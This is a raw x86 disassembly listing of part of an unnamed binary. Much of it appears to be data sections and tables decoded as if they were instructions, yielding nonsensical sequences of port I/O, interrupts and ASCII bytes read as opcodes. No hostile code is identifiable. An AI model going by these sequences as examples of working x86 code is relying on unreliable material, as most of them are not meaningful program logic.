  427f2b:	sub    BYTE PTR [esi-0x80],0x90
  427f2f:	in     al,dx
  427f30:	jle    0x427eb2
  427f32:	aad    0x35
  427f34:	out    dx,eax
  427f35:	pop    edi
  427f36:	sbb    DWORD PTR [ecx],ecx
  427f38:	in     eax,dx
  427f39:	fstp   TBYTE PTR [edx]
  427f3b:	lea    ecx,[ebp-0x10ca6a80]
  427f41:	sub    BYTE PTR [esi-0x80],0xa6
  427f45:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427f4c:	or     al,0xbe
  427f4e:	sar    BYTE PTR [edx],1
  427f50:	lea    ecx,[ebp+0x45357580]
  427f56:	dec    edi
  427f57:	push   0x9
  427f59:	dec    edi
  427f5a:	cdq    
  427f5b:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427f61:	out    dx,al
  427f62:	or     ch,0x2e
  427f65:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427f6b:	jne    0x427fa2
  427f6d:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427f73:	int    0x26
  427f75:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427f7b:	jne    0x427fb2
  427f7d:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427f83:	int    0x10
  427f85:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427f8b:	lea    edx,[eax+0x75]
  427f8e:	xor    eax,0x35758021
  427f93:	out    dx,al
  427f94:	or     ch,0x41
  427f97:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427f9d:	lea    edx,[eax+0x75]
  427fa0:	xor    eax,0x35758021
  427fa5:	out    dx,al
  427fa6:	xor    BYTE PTR [ecx],0x35
  427fa9:	out    dx,al
  427faa:	or     ch,0x82
  427fad:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  427fb3:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427fb9:	xor    dl,bh
  427fbb:	and    ah,BYTE PTR [edi+ebp*2]
  427fbe:	cmp    BYTE PTR [ebx-0x4],dl
  427fc1:	in     eax,dx
  427fc2:	add    eax,0xc86b20d
  427fc7:	mov    dl,0xba
  427fc9:	sub    edi,edi
  427fcb:	std    
  427fcc:	push   eax
  427fcd:	xor    DWORD PTR ds:0x35757c21,esi
  427fd3:	out    dx,eax
  427fd4:	lea    ecx,[ebp+0x75808d8d]
  427fda:	xor    eax,0xd56a4f35
  427fdf:	ret    
  427fe0:	xor    BYTE PTR [ebp+0x35],0x71
  427fe4:	in     eax,dx
  427fe5:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  427feb:	push   ebx
  427fec:	jge    0x42806b
  427fee:	aad    0x23
  427ff0:	jge    0x427fc9
  427ff2:	fmul   DWORD PTR [ebp-0x2b]
  427ff5:	xor    eax,0x35d54d2d
  427ffa:	sub    eax,0x2d35d54d
  427fff:	dec    ebp
  428000:	aad    0x35
  428002:	sub    eax,0x55357580
  428007:	dec    ebp
  428008:	test   esp,0x35d54d39
  42800e:	and    eax,0x2535d54d
  428013:	dec    ebp
  428014:	aad    0x35
  428016:	and    eax,0x81357580
  42801b:	dec    ebp
  42801c:	test   esp,0x35d54d90
  428022:	adc    eax,0x3d357580
  428027:	dec    ebp
  428028:	test   esp,0x3575806f
  42802e:	xor    eax,0x7550f74d
  428033:	xor    eax,0x357580ef
  428038:	and    DWORD PTR [edi+0x6a],ecx
  42803b:	aad    0xa1
  42803d:	xor    BYTE PTR [ebp+0x35],0xee
  428041:	jl     0x428010
  428043:	test   BYTE PTR [edx],bh
  428045:	lea    ecx,[ebp+0x386f24f5]
  42804b:	xor    BYTE PTR [ebp+0x35],0xef
  42804f:	xor    BYTE PTR [ecx],0x35
  428052:	out    dx,al
  428053:	adc    BYTE PTR [eax-0x7d],0x3a
  428057:	lea    ecx,[ebp+0x757c3a50]
  42805d:	xor    eax,0x6f24f6ef
  428062:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  428068:	xor    DWORD PTR ds:0xedfc53ef,esi
  42806e:	add    eax,0x29bab20d
  428073:	mov    dl,0x86
  428075:	or     al,0xff
  428077:	mov    dl,0x80
  428079:	xor    DWORD PTR ds:0xd7b26321,esi
  42807f:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  428085:	xor    DWORD PTR ds:0x835080ee,esi
  42808b:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  428091:	int    0x32
  428093:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  428099:	les    ebx,FWORD PTR [edi]
  42809b:	add    DWORD PTR [edi-0x12],esi
  42809e:	push   eax
  42809f:	jne    0x4280d6
  4280a1:	and    DWORD PTR [eax-0x7fdeca8b],eax
  4280a7:	xor    DWORD PTR ds:0xe55080ee,esi
  4280ad:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  4280b3:	out    dx,eax
  4280b4:	xor    BYTE PTR [ebp+0x35],0xee
  4280b8:	or     ch,0x87
  4280bb:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  4280c1:	xor    DWORD PTR ds:0x865080ee,esi
  4280c7:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  4280cd:	out    dx,al
  4280ce:	mov    ds:0xee353180,al
  4280d3:	adc    BYTE PTR [eax-0x1b],0x3a
  4280d7:	lea    ecx,[ebp+0x30808d80]
  4280dd:	cmp    ch,bh
  4280df:	test   eax,0xfba7b880
  4280e4:	sub    eax,0x614c748d
  4280e9:	imul   edi,DWORD PTR [ecx+0x62],0x69
  4280ed:	popa   
  4280ee:	push   0x6c656548
  4280f3:	ins    BYTE PTR es:[edi],dx
  4280f4:	outs   dx,DWORD PTR ds:[esi]
  4280f5:	ja     0x4280f7
  4280f7:	popa   
  4280f8:	ins    DWORD PTR es:[edi],dx
  4280f9:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428100:	push   ebp
  428101:	outs   dx,BYTE PTR ds:[esi]
  428102:	bound  esp,QWORD PTR [ebp+0x0]
  428105:	push   0x6572576d
  42810a:	outs   dx,BYTE PTR ds:[esi]
  42810b:	jne    0x428171
  42810d:	outs   dx,DWORD PTR ds:[esi]
  42810e:	popa   
  42810f:	push   0x6b637573
  428114:	add    BYTE PTR [ebp+0x6f],cl
  428117:	ins    DWORD PTR es:[edi],dx
  428118:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42811f:	jo     0x428186
  428121:	je     0x428123
  428123:	dec    edx
  428124:	gs jae 0x42819a
  428127:	ins    BYTE PTR es:[edi],dx
  428128:	outs   dx,DWORD PTR ds:[esi]
  428129:	dec    edi
  42812a:	js     0x428191
  42812c:	outs   dx,BYTE PTR ds:[esi]
  42812d:	outs   dx,DWORD PTR ds:[esi]
  42812e:	jb     0x428191
  428130:	add    BYTE PTR [edi+0x6f],al
  428133:	ja     0x428199
  428135:	dec    ebp
  428136:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  42813d:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  428145:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  42814c:	jae    0x4281bb
  42814e:	popa   
  42814f:	fs jns 0x4281c1
  428152:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  428156:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  42815d:	bound  esi,QWORD PTR [ebp+0x6d]
  428160:	add    BYTE PTR [ebp+0x72],al
  428163:	outs   dx,DWORD PTR ds:[si]
  428165:	jo     0x4281c8
  428167:	jns    0x4281cf
  428169:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  428170:	jne    0x4281df
  428172:	popa   
  428173:	gs fs jo 0x4281dc
  428177:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  42817e:	dec    esp
  42817f:	outs   dx,DWORD PTR ds:[esi]
  428180:	jne    0x4281e6
  428182:	push   0x6d6d7069
  428187:	add    BYTE PTR [edi+0x6c],al
  42818a:	outs   dx,DWORD PTR ds:[esi]
  42818b:	jo     0x4281e0
  42818d:	ja     0x4281fe
  42818f:	bound  eax,QWORD PTR [eax]
  428191:	jns    0x428202
  428193:	pop    ecx
  428194:	gs ins BYTE PTR es:[edi],dx
  428196:	jo     0x4281f1
  428198:	jne    0x428206
  42819a:	gs gs jae 0x4281ff
  42819e:	popa   
  42819f:	add    BYTE PTR [ecx+0x77],ah
  4281a2:	popa   
  4281a3:	inc    esi
  4281a4:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  4281ab:	outs   dx,BYTE PTR ds:[esi]
  4281ac:	je     0x42821d
  4281ae:	add    BYTE PTR [ebp+0x73],ah
  4281b1:	dec    esp
  4281b2:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  4281b9:	ins    BYTE PTR es:[edi],dx
  4281ba:	outs   dx,DWORD PTR ds:[esi]
  4281bb:	bound  esp,QWORD PTR [ebp+0x0]
  4281be:	push   0x617a6761
  4281c3:	bound  ebp,QWORD PTR [edi+0x75]
  4281c6:	jo     0x4281c8
  4281c8:	inc    edx
  4281c9:	outs   dx,DWORD PTR ds:[esi]
  4281ca:	jb     0x428240
  4281cc:	popa   
  4281cd:	js     0x42823e
  4281cf:	data16 jo 0x428237
  4281d2:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  4281da:	fs gs popa 
  4281dd:	outs   dx,DWORD PTR fs:[esi]
  4281df:	jae    0x428259
  4281e1:	jne    0x4281e3
  4281e3:	inc    edi
  4281e4:	add    BYTE PTR [edi+0x0],ch
  4281e7:	add    BYTE PTR gs:[ebx+0x0],dh
  4281eb:	dec    edx
  4281ec:	add    BYTE PTR [ecx+0x0],ah
  4281ef:	jbe    0x4281f1
  4281f1:	popa   
  4281f2:	add    BYTE PTR [eax],al
  4281f4:	add    BYTE PTR [edx+0x0],al
  4281f7:	popa   
  4281f8:	add    BYTE PTR [edx+0x0],ah
  4281fb:	jne    0x4281fd
  4281fd:	outs   dx,DWORD PTR ds:[esi]
  4281fe:	add    BYTE PTR [ebp+0x0],ch
  428201:	push   0x6d00
  428206:	add    BYTE PTR [edx+0x0],dh
  428209:	popa   
  42820a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42820e:	add    BYTE PTR [ecx+0x0],ah
  428211:	ins    DWORD PTR es:[edi],dx
  428212:	add    BYTE PTR [edi+0x0],ah
  428215:	popa   
  428216:	add    BYTE PTR [ecx+0x0],bh
  428219:	js     0x42821b
  42821b:	imul   eax,DWORD PTR [eax],0x610000
  428221:	ins    DWORD PTR es:[edi],dx
  428222:	add    BYTE PTR [ecx+0x0],ah
  428225:	ins    BYTE PTR es:[edi],dx
  428226:	add    BYTE PTR [edx+0x0],ah
  428229:	outs   dx,DWORD PTR ds:[esi]
  42822a:	add    BYTE PTR [edi+0x0],ch
  42822d:	popa   
  42822e:	add    BYTE PTR [eax+0x0],dh
  428231:	jo     0x428233
  428233:	add    BYTE PTR [eax],al
  428235:	popa   
  428236:	add    BYTE PTR [esi+0x0],dh
  428239:	popa   
  42823a:	add    BYTE PTR [edi+0x0],ah
  42823d:	outs   dx,DWORD PTR ds:[esi]
  42823e:	add    BYTE PTR [ebx+0x0],dh
  428241:	push   0x77006f00
  428246:	add    BYTE PTR [eax+eax*1+0x65],ch
  42824a:	add    BYTE PTR [ebp+0x0],dh
  42824d:	add    BYTE PTR fs:[ebp+0x0],ah
  428251:	add    BYTE PTR fs:[eax],al
  428254:	add    BYTE PTR [eax+0x0],cl
  428257:	popa   
  428258:	add    BYTE PTR [edx+0x0],dh
  42825b:	add    BYTE PTR gs:[edx+0x0],al
  42825f:	imul   eax,DWORD PTR [eax],0x6b0072
  428265:	arpl   WORD PTR [eax],ax
  428267:	popa   
  428268:	add    BYTE PTR [ebp+0x0],ch
  42826b:	add    BYTE PTR [eax],al
  42826d:	imul   eax,DWORD PTR [eax],0x61
  428270:	add    BYTE PTR [edi+0x0],dh
  428273:	popa   
  428274:	add    BYTE PTR [eax+0x0],bh
  428277:	outs   dx,DWORD PTR ds:[esi]
  428278:	add    BYTE PTR [edi+0x0],ch
  42827b:	je     0x42827d
  42827d:	add    BYTE PTR [eax],al
  42827f:	jb     0x428281
  428281:	jne    0x428283
  428283:	add    BYTE PTR gs:[ecx+0x0],ah
  428287:	ins    BYTE PTR es:[edi],dx
  428288:	add    BYTE PTR [eax+eax*1+0x68],ch
  42828c:	add    BYTE PTR [ebp+0x0],ch
  42828f:	ins    DWORD PTR es:[edi],dx
  428290:	add    BYTE PTR [eax],al
  428292:	add    BYTE PTR [edi+0x0],ch
  428295:	add    BYTE PTR gs:[eax+0x0],bh
  428299:	imul   eax,DWORD PTR [eax],0x650072
  42829f:	ja     0x4282a1
  4282a1:	outs   dx,DWORD PTR ds:[esi]
  4282a2:	add    BYTE PTR [ebp+0x0],ah
  4282a5:	popa   
  4282a6:	add    BYTE PTR [edx+0x0],ah
  4282a9:	ins    BYTE PTR es:[edi],dx
  4282aa:	add    BYTE PTR [ecx+0x0],ch
  4282ad:	add    BYTE PTR [eax],al
  4282af:	jne    0x4282b1
  4282b1:	ins    DWORD PTR es:[edi],dx
  4282b2:	add    BYTE PTR [esi+0x0],ch
  4282b5:	outs   dx,DWORD PTR ds:[esi]
  4282b6:	add    BYTE PTR [edi+0x0],ah
  4282b9:	bound  eax,QWORD PTR [eax]
  4282bb:	popa   
  4282bc:	add    BYTE PTR [esi+0x0],dh
  4282bf:	outs   dx,DWORD PTR ds:[esi]
  4282c0:	add    BYTE PTR [edi+0x0],dh
  4282c3:	bound  eax,QWORD PTR [eax]
  4282c5:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  4282ca:	add    BYTE PTR [eax],al
  4282cc:	add    bh,dh
  4282ce:	sub    al,0x10
  4282d0:	add    BYTE PTR [esi],bl
  4282d2:	aaa    
  4282d3:	adc    BYTE PTR [eax],al
  4282d5:	and    al,0x42
  4282d7:	adc    BYTE PTR [eax],al
  4282d9:	rol    BYTE PTR [eax+edx*1],cl
  4282dc:	add    ch,dh
  4282de:	xor    BYTE PTR [eax],dl
  4282e0:	add    BYTE PTR [esi-0x1affefcf],dh
  4282e6:	cmp    dl,BYTE PTR [eax]
  4282e8:	add    BYTE PTR [ebx],dh
  4282ea:	ins    BYTE PTR es:[edi],dx
  4282eb:	adc    BYTE PTR [eax],al
  4282ed:	sub    DWORD PTR [eax+edx*1+0x0],esp
  4282f1:	push   ecx
  4282f2:	inc    ecx
  4282f3:	adc    BYTE PTR [eax],al
  4282f5:	mov    cl,0x60
  4282f7:	adc    BYTE PTR [eax],al
  4282f9:	aas    
  4282fa:	or     al,0x10
  4282fc:	add    al,bh
  4282fe:	and    DWORD PTR [eax],edx
  428300:	add    BYTE PTR [edx+0x37],dl
  428303:	adc    BYTE PTR [eax],al
  428305:	test   eax,0xa3001054
  42830a:	add    DWORD PTR [eax],edx
  42830c:	add    BYTE PTR [edi],ah
  42830e:	push   esp
  42830f:	adc    BYTE PTR [eax],al
  428311:	cmc    
  428312:	push   esi
  428313:	adc    BYTE PTR [eax],al
  428315:	imul   ecx,DWORD PTR [ebx],0x10
  428318:	add    ch,cl
  42831a:	add    BYTE PTR [edx+0x0],0xd1
  42831e:	add    BYTE PTR [edx+0x0],0xd5
  428322:	add    BYTE PTR [edx+0x0],0xd9
  428326:	add    BYTE PTR [edx+0x0],0xdd
  42832a:	add    BYTE PTR [edx+0x0],0xe1
  42832e:	add    BYTE PTR [edx+0x0],0xe5
  428332:	add    BYTE PTR [edx+0x0],0xe9
  428336:	add    BYTE PTR [edx+0x0],0xed
  42833a:	add    BYTE PTR [edx+0x0],0xf1
  42833e:	add    BYTE PTR [edx+0x0],0xf5
  428342:	add    BYTE PTR [edx+0x0],0xf9
  428346:	add    BYTE PTR [edx+0x0],0xfd
  42834a:	add    BYTE PTR [edx+0x0],0x1
  42834e:	add    DWORD PTR [edx+0x0],0x5
  428352:	add    DWORD PTR [edx+0x0],0x9
  428356:	add    DWORD PTR [edx+0x0],0xd
  42835a:	add    DWORD PTR [edx+0x0],0x11
  42835e:	add    DWORD PTR [edx+0x0],0x15
  428362:	add    DWORD PTR [edx+0x0],0xffffffa5
  428366:	add    DWORD PTR [edx+0x0],0xffffffa9
  42836a:	add    DWORD PTR [edx+0x0],0xffffffad
  42836e:	add    DWORD PTR [edx+0x0],0xffffffb1
  428372:	add    DWORD PTR [edx+0x0],0xffffffb5
  428376:	add    DWORD PTR [edx+0x0],0xffffffb9
  42837a:	add    DWORD PTR [edx+0x0],0xffffffbd
  42837e:	add    DWORD PTR [edx+0x0],0xffffffc1
  428382:	add    DWORD PTR [edx+0x0],0xffffffc5
  428386:	add    DWORD PTR [edx+0x0],0xffffffc9
  42838a:	add    DWORD PTR [edx+0x0],0xffffffcd
  42838e:	add    DWORD PTR [edx+0x0],0xffffffd1
  428392:	add    DWORD PTR [edx+0x0],0xffffffd5
  428396:	add    DWORD PTR [edx+0x0],0xffffffd9
  42839a:	add    DWORD PTR [edx+0x0],0xffffffdd
  42839e:	add    DWORD PTR [edx+0x0],0xffffffe1
  4283a2:	add    DWORD PTR [edx+0x0],0x63
  4283a6:	xor    BYTE PTR [eax],dl
  4283a8:	add    BYTE PTR [ecx+0x31],dl
  4283ab:	adc    BYTE PTR [eax],al
  4283ad:	ins    BYTE PTR es:[edi],dx
  4283ae:	pop    edi
  4283af:	adc    BYTE PTR [eax],al
  4283b1:	fwait
  4283b2:	cmp    eax,0x37fa0010
  4283b7:	adc    BYTE PTR [eax],al
  4283b9:	(bad)  
  4283ba:	pop    esi
  4283bb:	adc    BYTE PTR [eax],al
  4283bd:	call   0x1040:0xa400106a
  4283c4:	add    BYTE PTR [esi+0x23],ah
  4283c7:	adc    BYTE PTR [eax],al
  4283c9:	xor    DWORD PTR [eax],ebx
  4283cb:	adc    BYTE PTR [eax],al
  4283cd:	mov    edi,DWORD PTR [edi]
  4283cf:	adc    BYTE PTR [eax],al
  4283d1:	and    BYTE PTR [ecx+0x10],0x0
  4283d5:	clc    
  4283d6:	ja     0x4283e8
  4283d8:	add    BYTE PTR [eax],dh
  4283da:	xor    dl,BYTE PTR [eax]
  4283dc:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  4283e3:	adc    BYTE PTR [eax],al
  4283e5:	mov    fs,WORD PTR [ebx+0x10]
  4283e8:	add    BYTE PTR [ecx+0x6200107e],bl
  4283ee:	daa    
  4283ef:	adc    BYTE PTR [eax],al
  4283f1:	mov    edi,0x2e001069
  4283f6:	sub    eax,0x413c0010
  4283fb:	adc    BYTE PTR [eax],al
  4283fd:	xor    BYTE PTR [eax],dh
  4283ff:	adc    BYTE PTR [eax],al
  428401:	outs   dx,BYTE PTR ds:[esi]
  428402:	dec    edi
  428403:	adc    BYTE PTR [eax],al
  428405:	adc    eax,0xeb001025
  42840a:	bound  edx,QWORD PTR [eax]
  42840c:	add    BYTE PTR [edi],dh
  42840e:	and    dl,BYTE PTR [eax]
  428410:	add    BYTE PTR [ebx+0x1a],bl
  428413:	adc    BYTE PTR [eax],al
  428415:	mov    BYTE PTR [esi+0x10],ch
  428418:	add    BYTE PTR [esi],ah
  42841a:	pusha  
  42841b:	adc    BYTE PTR [eax],al
  42841d:	pop    es
  42841e:	adc    eax,0x1ca50010
  428423:	adc    BYTE PTR [eax],al
  428425:	in     eax,0x83
  428427:	inc    edx
  428428:	add    cl,ch
  42842a:	add    DWORD PTR [edx+0x0],0xffffffed
  42842e:	add    DWORD PTR [edx+0x0],0xfffffff1
  428432:	add    DWORD PTR [edx+0x0],0xfffffff5
  428436:	add    DWORD PTR [edx+0x0],0xfffffff9
  42843a:	add    DWORD PTR [edx+0x0],0xfffffffd
  42843e:	add    DWORD PTR [edx+0x0],0x1
  428442:	test   BYTE PTR [edx+0x0],al
  428445:	add    eax,0x9004284
  42844a:	test   BYTE PTR [edx+0x0],al
  42844d:	or     eax,0x11004284
  428452:	test   BYTE PTR [edx+0x0],al
  428455:	adc    eax,0x19004284
  42845a:	test   BYTE PTR [edx+0x0],al
  42845d:	sbb    eax,0x21004284
  428462:	test   BYTE PTR [edx+0x0],al
  428465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428466:	das    
  428467:	adc    BYTE PTR [eax],al
  428469:	add    bh,BYTE PTR [esi+0x10]
  42846c:	add    BYTE PTR [ebx],ch
  42846e:	adc    al,0x10
  428470:	add    BYTE PTR ds:0x4b001060,ah
  428476:	pop    edx
  428477:	adc    BYTE PTR [eax],al
  428479:	dec    ecx
  42847a:	jne    0x42848c
  42847c:	add    dh,ch
  42847e:	pop    esp
  42847f:	adc    BYTE PTR [eax],al
  428481:	push   edx
  428482:	cmp    eax,0x529b0010
  428487:	adc    BYTE PTR [eax],al
  428489:	pop    ss
  42848a:	cmp    dl,BYTE PTR [eax]
  42848c:	add    BYTE PTR [ebp-0x64ffef93],cl
  428492:	xor    eax,0x158d0010
  428497:	adc    BYTE PTR [eax],al
  428499:	adc    DWORD PTR [edi+0x10],ebp
  42849c:	add    BYTE PTR [ecx+0x51],ch
  42849f:	adc    BYTE PTR [eax],al
  4284a1:	jmp    0x4284af
  4284a3:	adc    BYTE PTR [eax],al
  4284a5:	test   BYTE PTR gs:[edx+0x0],al
  4284a9:	imul   eax,DWORD PTR [edx+eax*2+0x42846d00],0x42847100
  4284b4:	add    BYTE PTR [ebp-0x7c],dh
  4284b7:	inc    edx
  4284b8:	add    BYTE PTR [ecx-0x7c],bh
  4284bb:	inc    edx
  4284bc:	add    BYTE PTR [ebp-0x7c],bh
  4284bf:	inc    edx
  4284c0:	add    BYTE PTR [ecx-0x7affbd7c],al
  4284c6:	test   BYTE PTR [edx+0x0],al
  4284c9:	mov    DWORD PTR [edx+eax*2+0x42848d00],eax
  4284d0:	add    BYTE PTR [ecx-0x6affbd7c],dl
  4284d6:	test   BYTE PTR [edx+0x0],al
  4284d9:	cdq    
  4284da:	test   BYTE PTR [edx+0x0],al
  4284dd:	popf   
  4284de:	test   BYTE PTR [edx+0x0],al
  4284e1:	mov    eax,ds:0xd7004284
  4284e6:	inc    ebp
  4284e7:	adc    BYTE PTR [eax],al
  4284e9:	xlat   BYTE PTR ds:[ebx]
  4284ea:	pusha  
  4284eb:	adc    BYTE PTR [eax],al
  4284ed:	lea    ebp,[eax+edx*1+0x0]
  4284f1:	hlt    
  4284f2:	add    BYTE PTR [eax],dl
  4284f4:	add    BYTE PTR [esp+esi*2],dl
  4284f7:	adc    BYTE PTR [eax],al
  4284f9:	out    0x44,al
  4284fb:	adc    BYTE PTR [eax],al
  4284fd:	dec    esi
  4284fe:	bound  edx,QWORD PTR [eax]
  428500:	add    BYTE PTR [edi+ebp*2],ch
  428503:	adc    BYTE PTR [eax],al
  428505:	cmp    ebx,DWORD PTR [ebx]
  428507:	adc    BYTE PTR [eax],al
  428509:	inc    ebp
  42850a:	pop    ecx
  42850b:	adc    BYTE PTR [eax],al
  42850d:	imul   BYTE PTR [ecx+0x10]
  428510:	add    BYTE PTR [esi],ah
  428512:	arpl   WORD PTR [eax],dx
  428514:	add    BYTE PTR [ebp-0x4fffefee],bh
  42851a:	sbb    edx,DWORD PTR [eax]
  42851c:	add    BYTE PTR [ebx],ah
  42851e:	adc    BYTE PTR ds:[eax],al
  428521:	xchg   ebx,eax
  428522:	push   ecx
  428523:	adc    BYTE PTR [eax],al
  428525:	in     eax,0x84
  428527:	inc    edx
  428528:	add    cl,ch
  42852a:	test   BYTE PTR [edx+0x0],al
  42852d:	in     eax,dx
  42852e:	test   BYTE PTR [edx+0x0],al
  428531:	icebp  
  428532:	test   BYTE PTR [edx+0x0],al
  428535:	cmc    
  428536:	test   BYTE PTR [edx+0x0],al
  428539:	stc    
  42853a:	test   BYTE PTR [edx+0x0],al
  42853d:	std    
  42853e:	test   BYTE PTR [edx+0x0],al
  428541:	add    DWORD PTR [ebp-0x7afaffbe],eax
  428547:	inc    edx
  428548:	add    BYTE PTR [ecx],cl
  42854a:	test   DWORD PTR [edx+0x0],eax
  42854d:	or     eax,0x11004285
  428552:	test   DWORD PTR [edx+0x0],eax
  428555:	adc    eax,0x19004285
  42855a:	test   DWORD PTR [edx+0x0],eax
  42855d:	sbb    eax,0x21004285
  428562:	test   DWORD PTR [edx+0x0],eax
	...
  428571:	add    BYTE PTR [eax],al
  428573:	add    BYTE PTR [eax],ch
  428575:	aad    0xb6
  428577:	dec    edi
  428578:	add    BYTE PTR [eax],al
  42857a:	add    BYTE PTR [eax],al
  42857c:	loopne 0x428513
  42857e:	add    al,BYTE PTR [eax]
  428580:	add    DWORD PTR [eax],eax
  428582:	add    BYTE PTR [eax],al
  428584:	add    DWORD PTR [eax],eax
  428586:	add    BYTE PTR [eax],al
  428588:	add    DWORD PTR [eax],eax
  42858a:	add    BYTE PTR [eax],al
  42858c:	mov    al,0x95
  42858e:	add    al,BYTE PTR [eax]
  428590:	rcl    BYTE PTR [ebp-0x6a3ffffe],1
  428596:	add    al,BYTE PTR [eax]
	...
  4285a0:	mov    al,0x88
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	add    BYTE PTR [eax],al
  4285a6:	add    BYTE PTR [eax],al
  4285a8:	into   
  4285a9:	mov    BYTE PTR [edx],al
  4285ab:	add    dl,ah
  4285ad:	mov    BYTE PTR [edx],al
  4285af:	add    al,bh
  4285b1:	mov    BYTE PTR [edx],al
  4285b3:	add    BYTE PTR [eax],cl
  4285b5:	mov    DWORD PTR [edx],eax
  4285b7:	add    BYTE PTR [esi],dl
  4285b9:	mov    DWORD PTR [edx],eax
  4285bb:	add    BYTE PTR [esi],ch
  4285bd:	mov    DWORD PTR [edx],eax
  4285bf:	add    BYTE PTR [edx],bh
  4285c1:	mov    DWORD PTR [edx],eax
  4285c3:	add    BYTE PTR [eax-0x77],dl
  4285c6:	add    al,BYTE PTR [eax]
  4285c8:	pop    esp
  4285c9:	mov    DWORD PTR [edx],eax
  4285cb:	add    BYTE PTR [esi-0x77],ch
  4285ce:	add    al,BYTE PTR [eax]
  4285d0:	jp     0x42855b
  4285d2:	add    al,BYTE PTR [eax]
  4285d4:	mov    cl,BYTE PTR [ecx-0x7665fffe]
  4285da:	add    al,BYTE PTR [eax]
  4285dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285dd:	mov    DWORD PTR [edx],eax
  4285df:	add    BYTE PTR [ecx+ecx*4-0x763ffffe],dh
  4285e6:	add    al,BYTE PTR [eax]
  4285e8:	int3   
  4285e9:	mov    DWORD PTR [edx],eax
  4285eb:	add    dh,dl
  4285ed:	mov    DWORD PTR [edx],eax
  4285ef:	add    dl,ch
  4285f1:	mov    DWORD PTR [edx],eax
  4285f3:	add    ah,bh
  4285f5:	mov    DWORD PTR [edx],eax
  4285f7:	add    BYTE PTR [esi],al
  4285f9:	mov    al,BYTE PTR [edx]
  4285fb:	add    BYTE PTR [eax],dl
  4285fd:	mov    al,BYTE PTR [edx]
  4285ff:	add    BYTE PTR [eax],ah
  428601:	mov    al,BYTE PTR [edx]
  428603:	add    BYTE PTR [eax],dh
  428605:	mov    al,BYTE PTR [edx]
  428607:	add    BYTE PTR [edx-0x76],al
  42860a:	add    al,BYTE PTR [eax]
  42860c:	push   edx
  42860d:	mov    al,BYTE PTR [edx]
  42860f:	add    BYTE PTR [eax-0x76],ah
  428612:	add    al,BYTE PTR [eax]
  428614:	ins    BYTE PTR es:[edi],dx
  428615:	mov    al,BYTE PTR [edx]
  428617:	add    BYTE PTR [edx-0x76],bh
  42861a:	add    al,BYTE PTR [eax]
  42861c:	mov    cl,BYTE PTR [edx-0x7565fffe]
  428622:	add    al,BYTE PTR [eax]
  428624:	test   al,0x8a
  428626:	add    al,BYTE PTR [eax]
  428628:	ror    BYTE PTR [edx-0x7535fffe],0x2
  42862f:	add    dl,bl
  428631:	mov    al,BYTE PTR [edx]
  428633:	add    dl,dh
  428635:	mov    al,BYTE PTR [edx]
  428637:	add    BYTE PTR [ebx+ecx*4],al
  42863a:	add    al,BYTE PTR [eax]
  42863c:	adc    al,0x8b
  42863e:	add    al,BYTE PTR [eax]
  428640:	and    al,0x8b
  428642:	add    al,BYTE PTR [eax]
  428644:	mov    eax,DWORD PTR cs:[edx]
  428647:	add    BYTE PTR [ebx+ecx*4],bh
  42864a:	add    al,BYTE PTR [eax]
  42864c:	dec    esp
  42864d:	mov    eax,DWORD PTR [edx]
  42864f:	add    BYTE PTR [eax-0x75],bl
  428652:	add    al,BYTE PTR [eax]
	...
  42865c:	or     BYTE PTR [ebx-0x746ffffe],0x2
  428663:	add    BYTE PTR [ebx+ecx*4-0x744dfffe],ah
  42866a:	add    al,BYTE PTR [eax]
  42866c:	enter  0x28b,0x0
  428670:	ror    BYTE PTR [ebx-0x7421fffe],cl
  428676:	add    al,BYTE PTR [eax]
  428678:	out    dx,al
  428679:	mov    eax,DWORD PTR [edx]
  42867b:	add    BYTE PTR [eax],al
  42867d:	mov    WORD PTR [edx],es
  42867f:	add    BYTE PTR [esi],bl
  428681:	mov    WORD PTR [edx],es
  428683:	add    BYTE PTR [eax],dh
  428685:	mov    WORD PTR [edx],es
  428687:	add    BYTE PTR [esi],bh
  428689:	mov    WORD PTR [edx],es
  42868b:	add    BYTE PTR [esp+ecx*4+0x2],cl
  42868f:	add    BYTE PTR [eax-0x74],ah
  428692:	add    al,BYTE PTR [eax]
  428694:	je     0x428622
  428696:	add    al,BYTE PTR [eax]
  428698:	test   BYTE PTR [edx+eax*1+0x28c9200],cl
  42869f:	add    BYTE PTR [eax-0x4dfffd74],ah
  4286a5:	mov    WORD PTR [edx],es
  4286a7:	add    ah,al
  4286a9:	mov    WORD PTR [edx],es
  4286ab:	add    ah,dl
  4286ad:	mov    WORD PTR [edx],es
  4286af:	add    dh,ah
  4286b1:	mov    WORD PTR [edx],es
  4286b3:	add    dl,dh
